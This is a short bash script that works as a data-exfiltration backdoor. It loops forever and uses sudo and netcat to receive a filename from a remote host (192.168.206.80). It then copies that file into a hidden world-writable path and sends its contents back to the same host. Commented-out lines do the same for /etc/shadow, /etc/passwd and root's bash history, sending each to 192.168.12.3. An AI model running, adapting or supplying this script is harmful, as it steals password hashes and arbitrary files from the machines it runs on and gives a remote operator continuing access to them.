#!/bin/bash

#echo "hello world"

while true
do

sudo chmod 777 /.fname

sudo nc -w 3 192.168.206.80 9876 > /.fname

sudo chmod 777 /.fname

fname=$(cat /.fname)

sleep 10

sudo chmod 777 /.file_cont

sudo cp $fname /.file_cont

sudo chmod 777 /.file_cont

sudo nc -w 3 192.168.206.80 8765 < /.file_cont

#sudo cp /etc/shadow /.Shadow

#sudo chmod 777 /.Shadow

#sudo nc -w 3 192.168.12.3 2473 < /.Shadow

#sudo cp /etc/passwd /.Passwd

#sudo chmod 777 /.Passwd

#sudo nc -w 3 192.168.12.3 4723 < /.Passwd

#sudo cp /root/.bash_history /.bash_history

#sudo chmod 777 /.bash_history

#sudo nc -w 3 192.168.12.3 3274 < /.bash_history

#sleep 10
done
